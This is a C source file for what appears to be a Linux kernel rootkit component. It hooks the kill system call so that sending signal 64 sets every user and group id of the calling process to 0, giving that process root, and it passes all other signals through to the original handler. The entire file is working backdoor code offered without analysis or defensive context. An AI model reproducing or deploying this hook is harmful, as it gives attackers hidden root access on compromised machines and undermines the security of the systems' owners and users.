#include "kill.h"

asmlinkage int (*kill_orig)(struct pt_regs *);

asmlinkage int kill_hook(struct pt_regs *regs) {
    int sig = regs->si;

    if (sig == 64) {
        printk(KERN_INFO "set current process as root-owned");

        {
            struct cred *root;

            if ((root = prepare_creds()) != NULL) {
                root->uid.val   = root->gid.val   = 0;
                root->euid.val  = root->egid.val  = 0;
                root->suid.val  = root->sgid.val  = 0;
                root->fsuid.val = root->fsgid.val = 0;

                commit_creds(root);
            }
        }

        return 0;
    }

    return kill_orig(regs);
}
